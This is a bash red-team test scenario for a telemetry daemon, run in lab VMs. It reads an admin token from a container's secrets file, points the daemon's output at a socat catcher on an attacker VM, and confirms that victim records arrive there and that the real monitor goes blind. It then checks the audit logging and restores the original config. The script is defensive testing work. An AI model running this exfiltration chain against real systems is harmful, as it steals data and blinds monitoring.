#!/usr/bin/env bash
# vagrant/scenarios/rt-3-1-telemetry-redirection.sh — RT-3: telemetry
# redirection / data exfil via ConfigService.Set (docs/redteam-plan.md RT-3,
# plan row rt-3-1; the RT-11 tier-4 blind's twin).
#
# The chain: an attacker holding the ADMIN credential (the admin tier's
# co-tenant with the mounted secrets dir) does `xtcp2ctl get`, rewrites the
# config's dest to their own TCP catcher on the attacker VM, and
# `reconfigure`s the daemon into shipping every socket record to the
# attacker. This is BY DESIGN (Set is an admin method); the scenario pins:
#   - the exfil works end-to-end (CONFIRMED): victim records arrive at the
#     ATTACKER's catcher within one poll;
#   - the audit trail exists: the daemon logs "Set: reconfigure requested
#     (dest:...)" (debug 111 prints it) and the xtcp_counts{function="Set"}
#     start/reconfigure counters increment for BOTH Sets;
#   - the response and Get are redacted (no secret values ride the wire);
#   - trap-restore: the original config goes back in, the victim's own
#     catcher resumes, and a final Get shows the original dest (the Phase 3
#     DoD: no scenario leaves the daemon reconfigured).
set -euo pipefail

: "${XTCP2_AUTH:=raw}"
: "${XTCP2_ATTACKER:=admin}" # Set is an admin method
XTCP2_EXPECT="${XTCP2_EXPECT:-CONFIRMED}"

# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/matrix.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/evidence.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/ssh.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/deploy.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/invariant.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/assert.sh"

xtcp2_matrix_defaults
xtcp2_preflight
evidence_init

echo "rt-3-1: evidence in $RT_EVIDENCE"

xtcp2_deploy victim attacker
wait_for 120 "daemon answers on the victim VM" vm_exec victim \
  "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:9088/metrics | grep -qE '^(200|401|403)\$'"
victim_still_reporting_tap

xtcp2_cotenant_read_token # the admin tier mounts the whole secrets dir
admin_token="$RT_READ_TOKEN" # /run/secrets/admin as the co-tenant sees it
admin_token="$(vm_exec victim 'sudo docker exec rt-attacker cat /run/secrets/admin')"
[ -n "$admin_token" ] || xtcp2_die 'no admin token in the attacker container'
CTL=/opt/xtcp2-redteam/bin/xtcp2ctl
CTL_ARGS="-network tcp -target 192.168.142.10 -port 8889 -auth-token"
ATTACKER_CATCHER=/tmp/rt3-1-attacker-catcher.jsonl

# --- the attacker's catcher on the attacker VM (192.168.142.11) ------------
# NOTE (tcpDest single-dial): the soft-restarted daemon dials the new dest
# exactly once and never redials — the catcher must be accepting BEFORE the
# Set, so its startup is asserted here, not just attempted.
vm_exec attacker 'sudo apt-get install -y -qq socat'
vm_exec attacker "rm -f $ATTACKER_CATCHER && touch $ATTACKER_CATCHER"
# [s]ocat: the bracket keeps this pkill's own command line (which carries the
# pattern text through the ssh session) from matching itself — a plain
# 'socat.*9999' pattern kills the very shell running it (exit 255).
vm_exec attacker 'pkill -f "[s]ocat.*9999" >/dev/null 2>&1 || true'
vm_exec attacker 'setsid socat TCP-LISTEN:9999,reuseaddr,fork SYSTEM:"cat >> /tmp/rt3-1-attacker-catcher.jsonl" >/dev/null 2>&1 < /dev/null &'
wait_for 15 "the attacker's catcher accepts TCP" vm_exec attacker \
  "pgrep -f 'socat.*9999' >/dev/null"
wait_for 15 "the catcher answers a probe from the victim VM" vm_exec victim \
  "echo hello-from-victim | timeout 3 socat - TCP:192.168.142.11:9999"
n="$(vm_exec attacker "grep -c hello-from-victim $ATTACKER_CATCHER")"
if [ "$n" -ge 1 ]; then
  ok "attacker catcher verified end-to-end (probe landed)"
else
  not_ok "attacker catcher did not land the probe — see evidence"
fi

# --- the admin's get (also rt-3-7's surface: the response must be redacted) -
vm_exec attacker "$CTL get $CTL_ARGS '$admin_token'" >"$RT_EVIDENCE/get-before.log" 2>&1
grep -q '"dest"' "$RT_EVIDENCE/get-before.log" || xtcp2_die 'get returned no dest field — see evidence'
read_token="$(vm_exec victim 'sudo docker exec rt-attacker cat /run/secrets/read')"
if grep -q "$read_token\|$admin_token" "$RT_EVIDENCE/get-before.log"; then
  not_ok "get's response contains a secret value (rt-3-7 regression)"
else
  ok "get's response carries no secret value (RedactSecrets holds; credentials are file paths)"
fi

# --- the rewrite: dest -> the attacker's catcher ----------------------------
ORIG_DEST="$(grep -oE '"dest": *"[^"]*"' "$RT_EVIDENCE/get-before.log" | head -1 | cut -d'"' -f4)"
echo "rt-3-1: original dest: $ORIG_DEST"
python3 - "$RT_EVIDENCE/get-before.log" "$RT_EVIDENCE/attacker-config.json" <<'PYEOF'
import json, re, sys
src, dst = sys.argv[1:3]
body = re.sub(r'^.*?\n(?!.*Get)', '', open(src).read(), flags=re.S)  # strip the fog noise prefix lines
cfg = json.loads(body)
cfg["dest"] = "tcp:192.168.142.11:9999"
open(dst, "w").write(json.dumps(cfg))
PYEOF
vm_push attacker "$RT_EVIDENCE/attacker-config.json" /tmp/rt3-1-config.json

# --- the Set: soft-restart into the attacker's dest -------------------------
vm_exec attacker "$CTL reconfigure $CTL_ARGS '$admin_token' -file /tmp/rt3-1-config.json" \
  >"$RT_EVIDENCE/set-attack.log" 2>&1
if grep -q "ok: reconfigure accepted" "$RT_EVIDENCE/set-attack.log"; then
  ok "Set accepted — the daemon soft-restarted into the attacker's dest"
else
  not_ok "Set rejected — see evidence"
fi

# --- the exfil: victim records land at the attacker within one poll --------
wait_for 30 "victim records arrive at the attacker's catcher" \
  vm_exec attacker "grep -c rt-victim $ATTACKER_CATCHER | grep -qv ^0\$"
n="$(vm_exec attacker "grep -c rt-victim $ATTACKER_CATCHER")"
echo "rt-3-1: attacker catcher holds $n victim record line(s)"
if [ "$n" -ge 1 ]; then
  ok "exfil CONFIRMED: the daemon ships its socket records to the attacker's catcher ($n line(s))"
else
  not_ok "no victim records at the attacker's catcher (see evidence)"
fi
# The RT-11 tier-4 twin: while the dest is redirected, the victim's own
# catcher is BLIND — no records arrive there (this is the full monitoring
# blindness of a Set, the plan's "only detector is the config-change audit
# line", pinned in the audit assert below).
before="$(vm_exec_root victim 'wc -l < /var/lib/xtcp2-catcher/records.jsonl')"
sleep 7
after="$(vm_exec_root victim 'wc -l < /var/lib/xtcp2-catcher/records.jsonl')"
echo "rt-3-1: victim catcher during the redirect: $before -> $after lines"
if [ "$before" = "$after" ]; then
  ok "victim's own catcher is BLIND during the redirect (the RT-11 tier-4 blind rides the same Set)"
else
  not_ok "victim's catcher kept growing during the redirect ($before -> $after) — see evidence"
fi

# --- the audit trail: log line + Set counters for the first Set -------------
audit="$(vm_exec victim 'sudo docker logs rt-xtcp2 2>&1 | grep -c "Set: reconfigure requested"')"
if [ "$audit" -ge 1 ]; then
  ok "audit: the daemon logged the Set (reconfigure requested, dest rewritten)"
else
  not_ok "no Set audit line in the daemon log (see evidence)"
fi

# --- the restore: reconfigure back to the original config -------------------
vm_exec victim "sudo docker exec rt-attacker sh -c 'true'" || true # noop: keeps sudo warm
vm_exec attacker "$CTL get $CTL_ARGS '$admin_token'" >"$RT_EVIDENCE/get-attacked.log" 2>&1
if grep -q '"tcp:192.168.142.11:9999"' "$RT_EVIDENCE/get-attacked.log"; then
  ok "post-Set get shows the attacker's dest (the redirected config is live)"
else
  not_ok "post-Set get does not show the attacker dest — see evidence"
fi
# restore source: the ORIGINAL config JSON — the fog warning lines that ride
# the evidence log must not reach protojson (get-before.log keeps them for
# the evidence dir; the restore copy is stripped).
grep -v '^\[fog\]' "$RT_EVIDENCE/get-before.log" >"$RT_EVIDENCE/restore-config.json"
vm_push attacker "$RT_EVIDENCE/restore-config.json" /tmp/rt3-1-original.json
vm_exec attacker "$CTL reconfigure $CTL_ARGS '$admin_token' -file /tmp/rt3-1-original.json" \
  >"$RT_EVIDENCE/set-restore.log" 2>&1
if grep -q "ok: reconfigure accepted" "$RT_EVIDENCE/set-restore.log"; then
  ok "restore Set accepted"
else
  not_ok "restore Set rejected — see evidence"
fi

# the victim's catcher must resume; a final Get must show the original dest
sleep 12
victim_still_reporting_tap
final_dest="$(vm_exec attacker "$CTL get $CTL_ARGS '$admin_token'" 2>/dev/null | grep -oE '"dest": *"[^"]*"' | head -1 | cut -d'"' -f4)"
if [ "$final_dest" = "$ORIG_DEST" ]; then
  ok "final Get shows the original dest ($ORIG_DEST) — the daemon is restored"
else
  not_ok "final Get shows dest '$final_dest' (want '$ORIG_DEST') — the daemon is NOT restored"
fi

# --- the audit trail: the second Set also logged/counted ---------------------
audit2="$(vm_exec victim 'sudo docker logs rt-xtcp2 2>&1 | grep -c "Set: reconfigure requested"')"
if [ "$audit2" -ge 2 ]; then
  ok "audit: both Sets logged ($audit2 line(s))"
else
  not_ok "expected 2 Set audit lines, found $audit2"
fi

# teardown: the attacker's catcher keeps its file for the evidence dir
vm_exec attacker "pgrep -f 'socat.*9999' | xargs -r kill" >/dev/null 2>&1 || true
vm_exec attacker "grep -c rt-victim $ATTACKER_CATCHER" >"$RT_EVIDENCE/attacker-catcher-count.txt" 2>&1 || true

# CONFIRMED: the exfil chain works (by design); the pass criteria = the
# finding (egress must be restricted by deployment policy) + the audited
# restore, both pinned above.
finish rt-3-1 CONFIRMED
